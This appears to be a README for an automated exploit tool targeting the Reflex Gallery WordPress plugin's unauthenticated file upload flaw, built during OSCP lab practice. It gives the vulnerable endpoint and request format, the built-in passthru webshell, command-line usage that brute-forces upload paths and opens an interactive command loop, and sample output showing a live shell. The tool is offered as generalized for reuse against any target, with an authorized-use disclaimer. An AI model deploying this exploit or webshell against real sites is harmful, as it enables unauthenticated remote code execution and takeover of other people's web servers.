# WP-Reflex-Gallery-3.1.3---Arbitrary-File-Upload
# Auto exploiter Reflex Gallery ≤ 3.1.3

Automated exploit for **Reflex Gallery ≤ 3.1.3 — Unauthenticated Arbitrary File Upload** ([EDB-36374](https://www.exploit-db.com/exploits/36374)).

Brute-forces the vulnerable plugin's `Year`/`Month` upload-path parameters, drops a PHP webshell, and confirms remote code execution — no manual HTML form or Burp repeater needed.

Built while working through **HA: Wordy** (VulnHub) during OSCP prep, generalized for reuse against any Reflex Gallery target.

---

## Vulnerability

`wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php` does not validate file type before writing the uploaded file to disk. Upload destination is attacker-controlled via `Year`/`Month` GET parameters, and no authentication is required.

```
POST /wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=<Y>&Month=<M>
Content-Type: multipart/form-data
```

**Impact:** unauthenticated remote code execution as the web server user (typically `www-data`).

---

## Features

- 🎯 Auto-discovers a writable `Year`/`Month` upload path (tries zero-padded and unpadded months)
- 🐚 Ships with a built-in default webshell (`passthru($_GET['cmd'])`) — zero setup required
- 🔁 Swap in your own custom shell with `-s/--shell` if preferred
- ✅ Confirms RCE automatically after upload (`?cmd=id`)
- 💻 Optional pseudo-interactive command loop (`--interactive`)

---

## Usage

```bash
pip install requests --break-system-packages   # if not already installed

# Default — no shell file needed, uses built-in webshell
python3 reflex_upload.py -u http://TARGET/wordpress

# Bring your own shell
python3 reflex_upload.py -u http://TARGET/wordpress -s myshell.php

# Narrow the brute-force range (faster if you already know rough upload dates)
python3 reflex_upload.py -u http://TARGET/wordpress --years 2014-2016 --months 1-6

# Confirm RCE and drop straight into a command loop
python3 reflex_upload.py -u http://TARGET/wordpress --interactive
```

### Options

| Flag | Description | Default |
|---|---|---|
| `-u`, `--url` | Base WordPress URL (required) | — |
| `-s`, `--shell` | Path to a custom PHP webshell | built-in `passthru` shell |
| `--years` | Year range to brute-force, e.g. `2013-2026` | `2013-2026` |
| `--months` | Month range to brute-force, e.g. `1-12` | `1-12` |
| `--interactive` | Drop into a pseudo-shell after confirming RCE | off |

### Example output

```
[*] Target: http://192.168.193.23/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
[*] Shell:  built-in default (cmd.php, passthru-based)
[*] Trying years 2013-2026, months 1-12 (zero-padded and not)

[+] Upload accepted: Year=2015 Month=03
[+] RCE confirmed! Shell live at: http://192.168.193.23/wordpress/wp-content/uploads/2015/03/cmd.php
[+] Example: http://192.168.193.23/wordpress/wp-content/uploads/2015/03/cmd.php?cmd=whoami
```

---

## Why brute-force Year/Month?

Some targets restrict `wp-content/uploads/` so only folders already created by legitimate WordPress media uploads are writable — attempting to upload into a nonexistent year/month combo returns:

```json
{"error":"Directory does not exist and could not be created."}
```

This script automates finding a valid, writable combo instead of guessing manually.

---

## Disclaimer

For authorized penetration testing, CTF, and lab environments only (VulnHub, HTB, PG, personal OSCP practice). Do not use against systems you don't own or have explicit written permission to test.

---

## Related

- [EDB-36374](https://www.exploit-db.com/exploits/36374) — original PoC
- [HA: Wordy (VulnHub)](https://www.vulnhub.com/entry/ha-wordy,363/) — box this was built for
